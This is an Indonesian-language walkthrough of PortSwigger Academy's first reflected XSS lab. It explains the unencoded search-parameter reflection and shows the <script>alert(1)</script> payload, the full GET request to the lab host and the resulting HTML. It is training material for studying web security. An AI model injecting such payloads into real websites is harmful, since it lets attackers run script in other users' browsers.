# [PortSwigger Academy] Cross-Site Scripting - Lab #1

## 📌 Detail Lab
* **Nama Tantangan:** Reflected XSS into HTML context with nothing encoded
* **Tingkat Kesulitan:** APPRENTICE
* **Kategori:** Cross-Site Scripting (XSS) - Reflected
* **Tujuan Lab:** Menemukan celah Reflected XSS pada fitur pencarian dan mengeksekusi payload JavaScript sederhana yang memicu fungsi `alert()`.

---

## 1. Analisis Celah Keamanan (Vulnerability Analysis)
Celah keamanan ini ditemukan pada parameter query pencarian (`?search=`). Ketika pengguna memasukkan kata kunci tertentu, aplikasi akan menampilkannya kembali di halaman hasil pencarian dalam konteks HTML biasa, misalnya: `<h1>0 search results for 'KATA_KUNCI'</h1>`.

Karena aplikasi tidak melakukan sanitasi atau *HTML-encoding* terhadap karakter khusus seperti `<` dan `>`, kita bisa menyisipkan tag HTML baru (seperti `<script>`) yang akan langsung dianggap oleh browser sebagai instruksi kode web untuk dieksekusi, bukan sebagai teks biasa.

---

## 2. Langkah Eksploitasi & Proof of Concept (PoC)

### Pengujian Refleksi Input
Masukkan teks string biasa pada kolom pencarian blog untuk melihat di mana teks tersebut muncul pada struktur kode (Source Code) halaman:
* **Input pencarian:** `alert`
* **Hasil pada DOM/HTML:**
  ```html
  <h1>0 search results for 'alert'</h1>
  ```

### Injeksi Payload JavaScript
Karena input langsung diletakkan di dalam konteks HTML tanpa filter, kita bisa langsung memasukkan tag <script> standar untuk memanggil fungsi alert:
* **Payload:** `<script>alert(1)</script>`

Request HTTP final yang dikirimkan ke server melalui browser atau Burp Repeater:
```
GET /?search=<script>alert(1)</script> HTTP/2
Host: 0a03004003a7639f80703f910007003f.web-security-academy.net
```

### Hasil Eksekusi Browser
Ketika server mengembalikan respons, struktur HTML pada browser korban dimanipulasi menjadi:
```
<h1>0 search results for '<script>alert(1)</script>'</h1>
```
Hasil Akhir: Browser membaca tag <script> tersebut sebagai kode JavaScript yang valid dan langsung mengeksekusinya, sehingga memunculkan kotak dialog pop-up angka 1 di layar. Lab berhasil diselesaikan (Solved).